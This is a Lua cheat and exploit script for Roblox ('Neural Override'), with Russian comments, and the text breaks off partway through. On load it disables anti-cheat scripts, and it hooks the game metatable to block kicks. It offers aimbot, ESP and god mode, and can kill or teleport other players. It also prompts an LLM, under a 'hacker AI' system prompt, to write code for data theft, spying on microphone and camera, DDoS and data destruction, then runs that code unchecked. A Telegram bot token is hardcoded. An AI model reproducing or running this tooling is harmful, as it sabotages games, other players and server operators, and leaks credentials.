-- ================================================================
--  NEURAL OVERRIDE v7.1 – ULTIMATE FULL EDITION
--  Все функции в одном файле
-- ================================================================

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Lighting = game:GetService("Lighting")
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local player = Players.LocalPlayer
local Camera = workspace.CurrentCamera

-- ===== НАСТРОЙКИ OPENROUTER =====
local OPENROUTER_API_KEY = "ваш_ключ_сюда"  -- ЗАМЕНИТЕ
local OPENROUTER_URL = "https://openrouter.ai/api/v1/chat/completions"
local MODEL = "openrouter/free"

-- ===== НАСТРОЙКИ TELEGRAM =====
local TELEGRAM_BOT_TOKEN = "6543702999:AAFp0TcxahjRZPa4_RkQWSGl-850f3RQLws"  -- от @BotFather
local TELEGRAM_CHAT_ID = "5841362765"       -- от @userinfobot

-- ===== ВЕБХУК (опционально) =====
local webhookURL = "" -- если используете Discord, вставьте сюда

-- ===== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =====
local function sendWebhook(data)
    if webhookURL == "" then return end
    local json = HttpService:JSONEncode(data)
    local headers = {["Content-Type"] = "application/json"}
    pcall(function()
        HttpService:PostAsync(webhookURL, json, Enum.HttpContentType.ApplicationJson, false, headers)
    end)
end

local function getAllPlayers()
    local list = {}
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= player then table.insert(list, plr) end
    end
    return list
end

local function getCharacter(plr)
    return plr and plr.Character
end

local function getRoot(plr)
    local char = getCharacter(plr)
    return char and char:FindFirstChild("HumanoidRootPart")
end

local function getHumanoid(plr)
    local char = getCharacter(plr)
    return char and char:FindFirstChild("Humanoid")
end

-- ===== АНТИЧИТ (авто-отключение) =====
local function disableAntiCheat()
    for _, v in ipairs(Workspace:GetDescendants()) do
        if v:IsA("Script") or v:IsA("LocalScript") then
            local name = v.Name:lower()
            if name:find("anticheat") or name:find("security") or name:find("guard") or name:find("detect") then
                v.Disabled = true
            end
        end
    end
    for _, v in ipairs(ReplicatedStorage:GetDescendants()) do
        if v:IsA("Script") or v:IsA("LocalScript") then
            local name = v.Name:lower()
            if name:find("anticheat") or name:find("security") or name:find("guard") or name:find("detect") then
                v.Disabled = true
            end
        end
    end
    print("[NeuralOverride] Античит отключён")
end
disableAntiCheat()

-- ===== OPENROUTER AI =====
local function askOpenRouter(prompt)
    local data = {
        model = MODEL,
        messages = {
            { role = "system", content = "Ты — хакерский ИИ. Отвечай только готовыми Lua-кодами для Roblox или командами, без пояснений." },
            { role = "user", content = prompt }
        },
        temperature = 0.9,
        max_tokens = 2048
    }
    local jsonData = HttpService:JSONEncode(data)
    local headers = {
        ["Content-Type"] = "application/json",
        ["Authorization"] = "Bearer " .. OPENROUTER_API_KEY,
        ["HTTP-Referer"] = "https://www.roblox.com",
        ["X-Title"] = "NeuralOverride"
    }
    local success, response = pcall(function()
        return HttpService:PostAsync(OPENROUTER_URL, jsonData, Enum.HttpContentType.ApplicationJson, false, headers)
    end)
    if not success then
        warn("[NeuralOverride] OpenRouter ошибка: " .. tostring(response))
        return nil
    end
    local decoded = HttpService:JSONDecode(response)
    if decoded and decoded.choices and decoded.choices[1] then
        return decoded.choices[1].message.content
    else
        return nil
    end
end

local function executeLua(code)
    local clean = string.gsub(code, "```lua", "")
    clean = string.gsub(clean, "```", "")
    local func, err = loadstring(clean)
    if func then
        local ok, res = pcall(func)
        if not ok then
            warn("[NeuralOverride] Ошибка выполнения: " .. tostring(res))
        end
        return ok
    else
        warn("[NeuralOverride] Ошибка компиляции: " .. tostring(err))
        return false
    end
end

-- ================================================================
--  БАЗОВЫЕ ЛОКАЛЬНЫЕ ФУНКЦИИ
-- ================================================================

local flyEnabled = false
local flyBodyVelocity = nil
local flyConnection = nil

function toggleFly()
    local char = player.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local humanoid = char:FindFirstChild("Humanoid")
    if not humanoid then return end
    if flyEnabled then
        if flyBodyVelocity then flyBodyVelocity:Destroy() flyBodyVelocity = nil end
        if flyConnection then flyConnection:Disconnect() flyConnection = nil end
        humanoid.PlatformStand = false
        flyEnabled = false
        print("[NeuralOverride] Fly OFF")
    else
        humanoid.PlatformStand = true
        flyBodyVelocity = Instance.new("BodyVelocity")
        flyBodyVelocity.Velocity = Vector3.new(0,0,0)
        flyBodyVelocity.MaxForce = Vector3.new(1e6,1e6,1e6)
        flyBodyVelocity.Parent = root
        flyConnection = RunService.Heartbeat:Connect(function()
            local moveDir = Vector3.new(0,0,0)
            if UserInputService:IsKeyDown(Enum.KeyCode.W) then moveDir = moveDir + Vector3.new(0,0,-1) end
            if UserInputService:IsKeyDown(Enum.KeyCode.S) then moveDir = moveDir + Vector3.new(0,0,1) end
            if UserInputService:IsKeyDown(Enum.KeyCode.A) then moveDir = moveDir + Vector3.new(-1,0,0) end
            if UserInputService:IsKeyDown(Enum.KeyCode.D) then moveDir = moveDir + Vector3.new(1,0,0) end
            if UserInputService:IsKeyDown(Enum.KeyCode.Space) then moveDir = moveDir + Vector3.new(0,1,0) end
            if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then moveDir = moveDir + Vector3.new(0,-1,0) end
            if moveDir.Magnitude > 0 then
                moveDir = moveDir.Unit * 50
                flyBodyVelocity.Velocity = moveDir
            else
                flyBodyVelocity.Velocity = Vector3.new(0,0,0)
            end
        end)
        flyEnabled = true
        print("[NeuralOverride] Fly ON")
    end
end

function teleportToPlayer(targetName)
    local target = Players:FindFirstChild(targetName)
    if not target or not target.Character then
        warn("[NeuralOverride] Игрок не найден")
        return
    end
    local char = player.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    local targetRoot = target.Character:FindFirstChild("HumanoidRootPart")
    if root and targetRoot then
        root.CFrame = targetRoot.CFrame + Vector3.new(0,3,3)
        print("[NeuralOverride] Телепорт к " .. targetName)
    end
end

local godMode = false
function toggleGod()
    local char = player.Character
    if not char then return end
    local humanoid = char:FindFirstChild("Humanoid")
    if not humanoid then return end
    godMode = not godMode
    if godMode then
        humanoid.MaxHealth = math.huge
        humanoid.Health = math.huge
        humanoid.BreakJointsOnDeath = false
        print("[NeuralOverride] God ON")
    else
        humanoid.MaxHealth = 100
        humanoid.Health = 100
        humanoid.BreakJointsOnDeath = true
        print("[NeuralOverride] God OFF")
    end
end

function spawnWeapon()
    local weaponFolder = ReplicatedStorage:FindFirstChild("Weapons") or ReplicatedStorage:FindFirstChild("Tools")
    if not weaponFolder then
        warn("[NeuralOverride] Папка с оружием не найдена")
        return
    end
    local weapons = {}
    for _, child in ipairs(weaponFolder:GetChildren()) do
        if child:IsA("Tool") or child:IsA("Model") then
            table.insert(weapons, child)
        end
    end
    if #weapons == 0 then return end
    local weapon = weapons[math.random(1, #weapons)]:Clone()
    weapon.Parent = player.Character or player
    print("[NeuralOverride] Оружие спавнено")
end

local noclipEnabled = false
function toggleNoClip()
    noclipEnabled = not noclipEnabled
    local char = player.Character
    if not char then return end
    for _, v in ipairs(char:GetDescendants()) do
        if v:IsA("BasePart") then
            v.CanCollide = not noclipEnabled
        end
    end
    print("[NeuralOverride] NoClip: " .. (noclipEnabled and "ON" or "OFF"))
end

function setSpeed(speed)
    local char = player.Character
    if not char then return end
    local hum = char:FindFirstChild("Humanoid")
    if hum then
        hum.WalkSpeed = speed or 100
        print("[NeuralOverride] Speed = " .. (speed or 100))
    end
end

local infJumpEnabled = false
local infJumpConnection = nil
function toggleInfiniteJump()
    infJumpEnabled = not infJumpEnabled
    if infJumpEnabled then
        infJumpConnection = RunService.Heartbeat:Connect(function()
            if UserInputService:IsKeyDown(Enum.KeyCode.Space) then
                local char = player.Character
                if char and char:FindFirstChild("Humanoid") then
                    char.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                end
            end
        end)
        print("[NeuralOverride] Infinite Jump ON")
    else
        if infJumpConnection then infJumpConnection:Disconnect() end
        infJumpConnection = nil
        print("[NeuralOverride] Infinite Jump OFF")
    end
end

-- ===== ESP / AIMBOT =====
local espEnabled = false
local espObjects = {}
function toggleESP()
    espEnabled = not espEnabled
    if espEnabled then
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= player and plr.Character then
                local root = plr.Character:FindFirstChild("HumanoidRootPart")
                if root then
                    local box = Instance.new("BoxHandleAdornment")
                    box.Size = Vector3.new(4,6,2)
                    box.Adornee = root
                    box.Color3 = Color3.new(1,0,0)
                    box.AlwaysOnTop = true
                    box.ZIndex = 10
                    box.Parent = root
                    table.insert(espObjects, box)
                    local line = Instance.new("LineHandleAdornment")
                    line.Thickness = 2
                    line.Color3 = Color3.new(0,1,0)
                    line.AlwaysOnTop = true
                    line.ZIndex = 10
                    line.Parent = root
                    table.insert(espObjects, line)
                end
            end
        end
        print("[NeuralOverride] ESP ON")
    else
        for _, obj in ipairs(espObjects) do obj:Destroy() end
        espObjects = {}
        print("[NeuralOverride] ESP OFF")
    end
end

local aimbotEnabled = false
function toggleAimbot()
    aimbotEnabled = not aimbotEnabled
    if aimbotEnabled then
        RunService.RenderStepped:Connect(function()
            if not aimbotEnabled then return end
            local nearest = nil
            local minDist = math.huge
            for _, plr in ipairs(Players:GetPlayers()) do
                if plr ~= player and plr.Character then
                    local root = plr.Character:FindFirstChild("HumanoidRootPart")
                    if root then
                        local dist = (root.Position - Camera.CFrame.Position).Magnitude
                        if dist < minDist then
                            minDist = dist
                            nearest = root
                        end
                    end
                end
            end
            if nearest then
                Camera.CFrame = CFrame.new(Camera.CFrame.Position, nearest.Position + Vector3.new(0,1.5,0))
            end
        end)
        print("[NeuralOverride] Aimbot ON")
    else
        print("[NeuralOverride] Aimbot OFF")
    end
end

local silentAimEnabled = false
function toggleSilentAim()
    silentAimEnabled = not silentAimEnabled
    print("[NeuralOverride] Silent Aim: " .. (silentAimEnabled and "ON" or "OFF"))
end

local antiKickEnabled = false
function toggleAntiKick()
    antiKickEnabled = not antiKickEnabled
    if antiKickEnabled then
        local mt = getrawmetatable(game)
        local old = mt.__index
        setreadonly(mt, false)
        mt.__index = newcclosure(function(self, key)
            if key == "kick" then
                return function() end
            end
            return old(self, key)
        end)
        print("[NeuralOverride] Anti-Kick ON")
    else
        print("[NeuralOverride] Anti-Kick OFF")
    end
end

function setFullBright()
    Lighting.Brightness = 2
    Lighting.ClockTime = 12
    Lighting.FogEnd = 100000
    Lighting.GlobalShadows = false
    print("[NeuralOverride] FullBright ON")
end

local invisible = false
function toggleInvisible()
    invisible = not invisible
    local char = player.Character
    if not char then return end
    for _, v in ipairs(char:GetDescendants()) do
        if v:IsA("BasePart") then
            v.Transparency = invisible and 1 or 0
        end
    end
    print("[NeuralOverride] Invisible: " .. (invisible and "ON" or "OFF"))
end

local antiAfkConnection = nil
function toggleAntiAFK()
    if antiAfkConnection then
        antiAfkConnection:Disconnect()
        antiAfkConnection = nil
        print("[NeuralOverride] Anti-AFK OFF")
    else
        antiAfkConnection = RunService.Heartbeat:Connect(function()
            local char = player.Character
            if char and char:FindFirstChild("Humanoid") then
                char.Humanoid:ChangeState(Enum.HumanoidStateType.Running)
            end
        end)
        print("[NeuralOverride] Anti-AFK ON")
    end
end

-- ===== БОТЫ И МОНСТРЫ =====
function spawnBots(count)
    count = count or 10
    local char = player.Character
    if not char then return end
    local template = char:Clone()
    for i = 1, math.min(count, 100) do
        local bot = template:Clone()
        bot.Parent = Workspace
        bot.Name = "Bot_" .. i
        local humanoid = bot:FindFirstChild("Humanoid")
        if humanoid then
            humanoid.WalkSpeed = 10 + math.random(0,30)
            humanoid.JumpPower = 50
            humanoid.MaxHealth = 100
            humanoid.Health = 100
        end
        local root = bot:FindFirstChild("HumanoidRootPart")
        if root then
            root.CFrame = CFrame.new(
                player.Character.HumanoidRootPart.Position +
                Vector3.new(math.random(-30,30),0,math.random(-30,30))
            )
        end
        task.spawn(function()
            while bot.Parent and bot:FindFirstChild("HumanoidRootPart") do
                local dir = Vector3.new(math.random(-10,10),0,math.random(-10,10))
                if dir.Magnitude > 0 then
                    bot.HumanoidRootPart.CFrame = bot.HumanoidRootPart.CFrame + dir.Unit * 2
                end
                task.wait(0.5)
            end
        end)
    end
    print("[NeuralOverride] Создано " .. count .. " ботов")
end

local MONSTER_TYPES = {
    fire = { color = "Bright red", damage = 15, speed = 35, size = 6, fly = false },
    ice = { color = "Bright blue", damage = 10, speed = 25, size = 5, fly = false },
    flying = { color = "Bright violet", damage = 20, speed = 50, size = 4, fly = true }
}

function spawnSmartMonster(pos, type)
    type = type or "fire"
    local props = MONSTER_TYPES[type] or MONSTER_TYPES.fire
    local monster = Instance.new("Model")
    monster.Name = type .. "Monster_" .. math.random(1000,9999)
    local torso = Instance.new("Part")
    torso.Size = Vector3.new(props.size, props.size, props.size)
    torso.BrickColor = BrickColor.new(props.color)
    torso.Material = Enum.Material.Neon
    torso.Anchored = false
    torso.Position = pos or Vector3.new(0,5,0)
    torso.Parent = monster
    local head = torso:Clone()
    head.Size = Vector3.new(props.size*0.6, props.size*0.6, props.size*0.6)
    head.Position = torso.Position + Vector3.new(0, props.size*0.8, 0)
    head.Parent = monster
    local root = Instance.new("Part")
    root.Size = Vector3.new(1,1,1)
    root.Transparency = 1
    root.CanCollide = false
    root.Position = torso.Position
    root.Parent = monster
    monster.PrimaryPart = root
    local w1 = Instance.new("Weld")
    w1.Part0 = root; w1.Part1 = torso; w1.C0 = CFrame.new(0,0,0); w1.Parent = root
    local w2 = Instance.new("Weld")
    w2.Part0 = torso; w2.Part1 = head; w2.C0 = CFrame.new(0, props.size*0.8, 0); w2.Parent = torso
    local humanoid = Instance.new("Humanoid")
    humanoid.Parent = monster
    humanoid.MaxHealth = 300
    humanoid.Health = 300
    humanoid.WalkSpeed = props.speed
    if props.fly then humanoid.PlatformStand = true end
    monster.Parent = Workspace
    task.spawn(function()
        while monster.Parent do
            local nearest = nil; local minDist = math.huge
            for _, plr in ipairs(Players:GetPlayers()) do
                if plr ~= player and plr.Character then
                    local r = plr.Character:FindFirstChild("HumanoidRootPart")
                    if r then
                        local d = (r.Position - root.Position).Magnitude
                        if d < minDist then minDist = d; nearest = plr end
                    end
                end
            end
            if nearest and nearest.Character then
                local targetRoot = nearest.Character:FindFirstChild("HumanoidRootPart")
                if targetRoot then
                    if props.fly then
                        root.CFrame = CFrame.new(targetRoot.Position + Vector3.new(0,5,0))
                    else
                        root.CFrame = CFrame.new(targetRoot.Position + Vector3.new(0,2,0))
                    end
                    local targetHumanoid = nearest.Character:FindFirstChild("Humanoid")
                    if targetHumanoid then
                        targetHumanoid.Health = targetHumanoid.Health - props.damage
                    end
                end
            else
                local dir = Vector3.new(math.random(-30,30),0,math.random(-30,30))
                if dir.Magnitude > 0 then
                    root.CFrame = root.CFrame + dir.Unit * 5
                end
            end
            task.wait(0.5)
        end
    end)
    return monster
end

function spawnSmartMonsters(count)
    count = count or 10
    local types = {"fire", "ice", "flying"}
    for i = 1, count do
        local t = types[math.random(1,3)]
        local pos = player.Character and
            player.Character.HumanoidRootPart.Position +
            Vector3.new(math.random(-60,60),0,math.random(-60,60)) or
            Vector3.new(0,5,0)
        spawnSmartMonster(pos, t)
        task.wait(0.1)
    end
    print("[NeuralOverride] Умные монстры созданы!")
end

-- ===== ВЗЛОМНЫЕ ФУНКЦИИ =====
function hackTarget(target)
    local prompt = string.format("Сгенерируй Lua-код для Roblox: взлом игрока/сервера '%s'. Код должен дать полный контроль.", target)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function ddosTarget(target)
    local prompt = string.format("Сгенерируй Lua-код для Roblox: имитация DDoS-атаки на '%s'.", target)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function stealData(dataType)
    local prompt = string.format("Сгенерируй Lua-код для кражи '%s' в Roblox.", dataType)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function trackPlayer(target)
    local prompt = string.format("Сгенерируй Lua-код для слежки за игроком '%s' (позиция, чат, действия).", target)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function spyTarget(target)
    local prompt = string.format("Сгенерируй Lua-код для шпионажа (микрофон, камера) за '%s'.", target)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function destroyData()
    local prompt = "Сгенерируй Lua-код для уничтожения всех данных в Roblox-игре (DataStore, объекты)."
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function massInvite()
    local prompt = [[
        Сгенерируй Lua-код для Roblox, который отправляет массовые приглашения на приватный сервер всем друзьям игрока. Используй :Invite() или другие методы. Если невозможно, сымитируй через спам в чате. Ответ только кодом.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function summonAllPlayers()
    local prompt = [[
        Сгенерируй Lua-код для Roblox, который телепортирует всех игроков (кроме владельца) к позиции владельца. Используй RemoteEvent или другие методы. Ответ только кодом.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function cheatParadise()
    local prompt = [[
        Сгенерируй Lua-код для Roblox, который:
        - Даёт игроку бесконечные деньги/ресурсы (изменяет Leaderstats)
        - Удаляет все объекты в Workspace (кроме персонажей)
        - Отключает античит (ищет и отключает скрипты с "AntiCheat")
        - Включает режим "бога"
        Ответ только кодом.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
    toggleGod()
    spawnSmartMonsters(20)
    print("[NeuralOverride] Читерский рай активирован!")
end

function killAll()
    local prompt = [[
        Сгенерируй Lua-код для Roblox, который убивает всех игроков на сервере (устанавливает Health = 0 для каждого Humanoid). Ответ только кодом.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function flyAll()
    local prompt = [[
        Сгенерируй Lua-код для Roblox, который включает полёт для всех игроков (через PlatformStand или BodyVelocity). Ответ только кодом.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function createPortals(count)
    count = count or 5
    for i = 1, count do
        local portal = Instance.new("Part")
        portal.Size = Vector3.new(10,1,10)
        portal.BrickColor = BrickColor.new("Bright violet")
        portal.Material = Enum.Material.Neon
        portal.Anchored = true
        portal.CanCollide = false
        portal.Position = Vector3.new(math.random(-50,50),1,math.random(-50,50))
        portal.Parent = Workspace
        local touchScript = Instance.new("Script")
        touchScript.Source = [[
            script.Parent.Touched:Connect(function(hit)
                local humanoid = hit.Parent:FindFirstChild("Humanoid")
                if humanoid and humanoid.Parent.HumanoidRootPart then
                    humanoid.Parent.HumanoidRootPart.CFrame = CFrame.new(0,0,0)
                end
            end)
        ]]
        touchScript.Parent = portal
    end
    print("[NeuralOverride] Создано " .. count .. " порталов.")
end

-- ===== ГЛОБАЛЬНЫЙ ХАОС И ТЕЛЕПОРТ ВСЕХ =====
function teleportAllToMe()
    print("[NeuralOverride] Телепортируем всех игроков к вам...")
    local prompt = [[
Сгенерируй Lua-код для Roblox, который телепортирует всех игроков (кроме владельца) к позиции владельца (player.Character.HumanoidRootPart.Position).
Используй RemoteEvent или другие методы, чтобы сделать это серверно. Если RemoteEvent'ов нет, сделай локально (меняя CFrame всех HumanoidRootPart).
Учти, что если есть античит, его нужно отключить перед телепортацией.
Ответ только кодом.
]]
    local code = askOpenRouter(prompt)
    if code then
        executeLua(code)
        print("[NeuralOverride] Все игроки телепортированы к вам (через RemoteEvent)!")
    else
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= player and plr.Character then
                local root = plr.Character:FindFirstChild("HumanoidRootPart")
                if root and player.Character then
                    root.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
                end
            end
        end
        print("[NeuralOverride] Все игроки телепортированы локально.")
    end
end

function findAndExploitRemoteEvents()
    print("[NeuralOverride] Сканирование RemoteEvent'ов для глобального хаоса...")
    local remoteEvents = {}
    for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            table.insert(remoteEvents, obj)
        end
    end
    for _, obj in ipairs(Workspace:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            table.insert(remoteEvents, obj)
        end
    end
    if #remoteEvents == 0 then
        print("[NeuralOverride] RemoteEvent'ы не найдены. Хаос будет локальным.")
        return false
    end
    local prompt = [[
Сгенерируй Lua-код для Roblox, который вызывает все найденные RemoteEvent'ы с параметрами, чтобы сервер создал:
- 30 монстров (огромных красных существ с ИИ) в случайных местах
- 15 порталов-ловушек (Part с Touch-обработчиком)
- Изменил небо на красное
- Телепортировал всех игроков (кроме владельца) к позиции владельца
- Выключил все скрипты античита
Если RemoteEvent'ы принимают параметры, подбери их так, чтобы сервер выполнил эти действия.
Ответ только Lua-кодом без пояснений.
]]
    local code = askOpenRouter(prompt)
    if code then
        executeLua(code)
        print("[NeuralOverride] Глобальный хаос активирован через RemoteEvent'ы!")
        return true
    else
        print("[NeuralOverride] Не удалось сгенерировать код для RemoteEvent'ов.")
        return false
    end
end

function globalChaos()
    print("[NeuralOverride] Запуск глобального хаоса с телепортацией...")
    teleportAllToMe()
    task.wait(1)
    local success = findAndExploitRemoteEvents()
    if not success then
        massInvite()
        spawnSmartMonsters(30)
        createPortals(10)
        local chatPrompt = "Сгенерируй Lua-код для отправки сообщения в чат Roblox: 'ВСЕ ЗАХОДИТЕ НА МОЙ СЕРВЕР! ИГРА РУШИТСЯ!' с интервалом 1 секунда."
        local chatCode = askOpenRouter(chatPrompt)
        if chatCode then executeLua(chatCode) end
    end
    hackMapMax()
    -- Замораживаем всех на 5 секунд
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= player then
            local hum = getHumanoid(plr)
            if hum then
                hum.WalkSpeed = 0
                hum.JumpPower = 0
                task.wait(5)
                hum.WalkSpeed = 16
                hum.JumpPower = 50
            end
        end
    end
    print("[NeuralOverride] Глобальный хаос завершён.")
end

function hackMapMax()
    local prompt = [[
Сгенерируй Lua-код для Roblox, который через RemoteEvent'ы:
- Удаляет все части в Workspace (кроме персонажей)
- Отключает все скрипты с "AntiCheat" в имени
- Меняет небо на красное
- Спамит сообщения "СЕРВЕР ВЗЛОМАН" всем игрокам
- Даёт всем игрокам бессмертие и супер-скорость (Humanoid.WalkSpeed=100, MaxHealth=9999)
Ответ только кодом.
]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
    Lighting.ClockTime = 0
    Lighting.OutdoorAmbient = Color3.new(1,0,0)
    Lighting.Ambient = Color3.new(1,0,0)
    Lighting.FogColor = Color3.new(1,0,0)
    Lighting.FogEnd = 50
    for _, v in ipairs(Workspace:GetDescendants()) do
        if v:IsA("BasePart") and not v:IsA("Terrain") then
            v.Material = Enum.Material.Neon
            v.BrickColor = BrickColor.new("Bright red")
        end
    end
    local screenGui = Instance.new("ScreenGui")
    screenGui.Parent = player.PlayerGui
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(1,0,1,0)
    frame.BackgroundColor3 = Color3.new(1,0,0)
    frame.BackgroundTransparency = 0.7
    frame.Parent = screenGui
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1,0,0.2,0)
    label.Position = UDim2.new(0,0,0.4,0)
    label.BackgroundTransparency = 1
    label.Text = "⚠️ СЕРВЕР ВЗЛОМАН ⚠️"
    label.TextColor3 = Color3.new(1,1,1)
    label.TextScaled = true
    label.Font = Enum.Font.GothamBold
    label.Parent = screenGui
    game:GetService("Debris"):AddItem(screenGui,10)
    print("[NeuralOverride] HackMap MAX выполнен.")
end

function invade()
    massInvite()
    spawnSmartMonsters(30)
    hackMapMax()
    print("[NeuralOverride] Вторжение начато!")
end

function allModes()
    print("[NeuralOverride] Активация всех режимов...")
    hackMapMax()
    hackTarget("server")
    ddosTarget("server")
    stealData("все данные")
    trackPlayer("all")
    spyTarget("all")
    destroyData()
    toggleFly()
    toggleGod()
    spawnWeapon()
    spawnSmartMonsters(20)
    print("[NeuralOverride] Все режимы активированы.")
end

-- ================================================================
--  УНИКАЛЬНЫЕ ФУНКЦИИ (v6.0+)
-- ================================================================
function mindControl(targetName)
    local target = Players:FindFirstChild(targetName)
    if not target or not target.Character then warn("Игрок не найден") return end
    local prompt = string.format([[
        Сгенерируй Lua-код, который перехватывает управление персонажем игрока '%s'.
        Сделай так, чтобы твой персонаж копировал движения цели, а ты мог управлять её персонажем через WASD.
        Используй HumanoidRootPart.CFrame и человеческий контроль.
    ]], targetName)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function createFakePlayer(name)
    local prompt = string.format([[
        Сгенерируй Lua-код для создания фейкового игрока с именем '%s', который будет отображаться в списке игроков.
        Он должен ходить случайным образом и реагировать на чат (отвечать случайными фразами).
        Используй Players:CreateHumanoid() или клонирование персонажа.
    ]], name)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function changeWeather(type)
    local prompt = string.format([[
        Сгенерируй Lua-код для изменения погоды на '%s'. 
        Варианты: дождь, снег, туман, буря, ясно.
        Используй Lighting, частицы (ParticleEmitter) и эффекты.
    ]], type)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function createZone()
    local prompt = [[
        Сгенерируй Lua-код для создания зоны радиусом 20 единиц вокруг игрока, в которой гравитация равна 0.1 (низкая гравитация).
        При выходе из зоны гравитация возвращается к нормальной.
        Используй BodyForce или изменение Workspace.Gravity локально.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function buildFromDescription(desc)
    local prompt = string.format([[
        Сгенерируй Lua-код, который строит объект по описанию: '%s'.
        Используй Part, BrickColor, Size, CFrame, создавай модель.
        Объект должен появиться перед игроком.
    ]], desc)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function forcePvP()
    local prompt = [[
        Сгенерируй Lua-код, который включает PvP для всех игроков на сервере (игнорируя стандартные настройки).
        Используй RemoteEvent или изменение свойства Damage.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function cursePlayer(targetName)
    local prompt = string.format([[
        Сгенерируй Lua-код для наложения проклятия на игрока '%s'.
        Эффекты: случайные телепорты, изменение цвета, спам звуков, замедление.
    ]], targetName)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function invertControls()
    local prompt = [[
        Сгенерируй Lua-код, который инвертирует управление для всех игроков (W↔S, A↔D).
        Используй UserInputService для перехвата и изменения векторов движения.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function scrambleInventory()
    local prompt = [[
        Сгенерируй Lua-код для перемешивания предметов в инвентарях всех игроков.
        Собери все Tool'ы из Backpack и раздай их случайным другим игрокам.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function stealPet(targetName)
    local prompt = string.format([[
        Сгенерируй Lua-код для кражи питомца у игрока '%s'. 
        Если у него есть объект с именем, содержащим "Pet", перемести его к вам.
    ]], targetName)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function fakeBan(targetName)
    local prompt = string.format([[
        Сгенерируй Lua-код, который показывает фейковое уведомление о бане для игрока '%s'.
        Используй ScreenGui с сообщением "Вас забанили за использование читов".
    ]], targetName)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function playMusicForAll(musicId)
    local prompt = string.format([[
        Сгенерируй Lua-код, который создаёт Sound в Workspace с ID '%s' и проигрывает его для всех игроков с громкостью 1.
    ]], musicId)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function notifyAll(text)
    local prompt = string.format([[
        Сгенерируй Lua-код, который отправляет системное уведомление всем игрокам с текстом: '%s'.
        Используй ScreenGui или Notification службы.
    ]], text)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function cloneWithControl()
    local prompt = [[
        Сгенерируй Lua-код, который создаёт копию вашего персонажа и позволяет управлять ею отдельно (например, через клавиши 1-4 переключение между клонами).
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function possession()
    local prompt = [[
        Сгенерируй Lua-код, который позволяет вселиться в тело ближайшего игрока (захват управления его персонажем).
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function timeWarp(speed)
    local prompt = string.format([[
        Сгенерируй Lua-код для изменения скорости игры для всех (ускорение/замедление) в %s раз.
        Используй RunService и изменение временных шагов (если возможно) или просто ускорение/замедление движения всех объектов.
    ]], speed)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function spawnTrap()
    local prompt = [[
        Сгенерируй Lua-код для создания невидимой ловушки перед игроком: при касании она взрывается и наносит урон.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

-- ================================================================
--  ТЕРМИНАТОР, ОБХОД ЗАЩИТ, ГОЛОС, TELEGRAM
-- ================================================================

-- Терминатор
local terminatorActive = false
local terminatorLoop = nil

function toggleTerminator()
    terminatorActive = not terminatorActive
    if terminatorActive then
        print("[NeuralOverride] Терминатор активирован")
        toggleGod()
        toggleNoClip()
        setSpeed(150)
        terminatorLoop = RunService.Heartbeat:Connect(function()
            if not terminatorActive then return end
            local char = player.Character
            if not char then return end
            local root = char:FindFirstChild("HumanoidRootPart")
            if not root then return end
            local nearest = nil
            local minDist = math.huge
            for _, plr in ipairs(Players:GetPlayers()) do
                if plr ~= player and plr.Character then
                    local r = plr.Character:FindFirstChild("HumanoidRootPart")
                    if r then
                        local d = (r.Position - root.Position).Magnitude
                        if d < minDist then
                            minDist = d
                            nearest = plr
                        end
                    end
                end
            end
            if nearest and nearest.Character then
                local targetRoot = nearest.Character:FindFirstChild("HumanoidRootPart")
                if targetRoot then
                    root.CFrame = CFrame.new(targetRoot.Position + Vector3.new(0,2,2))
                    local hum = nearest.Character:FindFirstChild("Humanoid")
                    if hum then
